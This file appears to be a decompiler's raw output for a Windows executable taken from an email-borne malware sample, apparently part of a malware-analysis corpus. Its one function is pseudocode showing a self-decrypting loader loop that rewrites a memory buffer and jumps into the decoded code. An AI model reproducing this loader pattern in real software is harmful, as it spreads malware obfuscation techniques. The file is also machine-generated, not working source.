// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1315/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn0055A4D0(Eq_144 * ebp, Eq_158 ds)
{
fn0055A4D0_entry:
	def fp
	def ds
	def cs
	def ebp
	goto l0055A4D0
l0055A4AA:
	eax_71 = eax_51 ^ 0xED4BB636;
	al_72 = (byte) eax_71;
	ecx_75 = ecx_54 - 0x00000001;
	branch ecx_75 != 0x00000000 l0055A51E
l0055A4B1:
	ecx_77 = ecx_75 + 0x00000001;
	cl_78 = (byte) ecx_77;
	v20_79 = ebp->t60BFB5B9;
	ebp->t60BFB5B9 = cl_78;
	cl_81 = v20_79;
	ecx_82 = DPB(ecx_77, cl_81, 0, 8);
	esp_83 = esp_60 - 0x00000004;
	Mem84[esp_83 + 0x00000000:word32] = ds
	v22_85 = eax_71->ptrFFFFFFD9;
	eax_71->ptrFFFFFFD9 = esp_83;
	esp_87 = v22_85;
	esp_89 = esp_87 - 0x00000004;
	*esp_89 = eax_71;
	esp_91 = esp_89 - 0x00000004;
	*esp_91 = ecx_82;
	esp_93 = esp_91 - 0x00000004;
	*esp_93 = edx_57;
	esp_95 = esp_93 - 0x00000004;
	*esp_95 = 0x0055B67C;
	esp_97 = esp_95 - 0x00000004
	Mem98[esp_97 + 0x00000000:word32] = esp_97
	esp_99 = esp_97 - 0x00000004;
	*esp_99 = ebp;
	esp_101 = esp_99 - 0x00000004;
	*esp_101 = 0x0055B200;
	esp_103 = esp_101 - 0x00000004;
	*esp_103 = edi_36;
	esp_105 = esp_103 - 0x00000004;
	Mem106[esp_105 + 0x00000000:word32] = cs
	esp_107 = esp_105 - 0x00000004;
	Mem108[esp_107 + 0x00000000:word32] = ds
	return
l0055A4D0:
	edi_3 = &globals->t55B200;
l0055A4EF:
	edi_8 = PHI(edi_3, edi_36)
	esp_9 = fp - 0x00000004;
	fp->dw0000 = 0x00000000;
	edx_11 = fp - 0x00000004;
	dl_12 = (byte) (fp - 0x00000004);
	dwLoc08_14 = fp - 0x00000004;
	dwLoc0C_16 = fp - 0x00000004;
	dwLoc10_18 = fp - 0x00000004;
	esp_19 = fp - 0x00000014;
	fp->dw0000 = 0x00000000;
	esp_21 = fp - 0x00000018;
	fp->dw0000 = 0x00000000;
	eax_23 = GetTapePosition(0x00000000, 0x00000000, fp - 0x00000004, fp - 0x00000004, fp - 0x00000004);
	ecx_25 = 0x00000000;
	cl_26 = 0x00;
	esp_27 = fp;
	eax_28 = eax_23 + 0xBF23DFF9;
	al_29 = (byte) (eax_23 + 0xBF23DFF9);
	v10_30 = *edi_8 + (eax_23 + 0xBF23DFF9);
	*edi_8 = v10_30;
	*edi_8 = __ror(*edi_8, 0x10);
	edi_34 = PTRADD(edi_8,18);
	edi_35 = edi_34 - 0x00000001;
	edi_36 = edi_34 - 0x0000000E;
	branch edi_36 <= &globals->dw55B67C l0055A4EF
l0055A516:
	0x0055B200()
	Mem47[0x2BCD7304:byte] = __ror((byte *) 0x2BCD7304, cl_26)
l0055A51E:
	dl_49 = PHI(dl_12, dl_56)
	edx_50 = PHI(edx_11, edx_57)
	eax_51 = PHI(eax_28, eax_71)
	al_52 = PHI(al_29, al_72)
	ecx_54 = PHI(ecx_25, ecx_75)
	esp_55 = PHI(esp_27, esp_60)
	dl_56 = dl_49 & al_52;
	edx_57 = DPB(edx_50, dl_56, 0, 8);
	esp_60 = esp_55 - 0x00000004;
	esp_60->dw0000 = 0x864C8E7F;
	branch dl_56 > 0x00 l0055A4AA
l0055A527:
	esp_63 = &esp_60->dw0000;
	esp_65 = esp_63 - 0x00000004;
	Mem66[esp_65 + 0x00000000:word32] = cs
fn0055A4D0_exit:
}

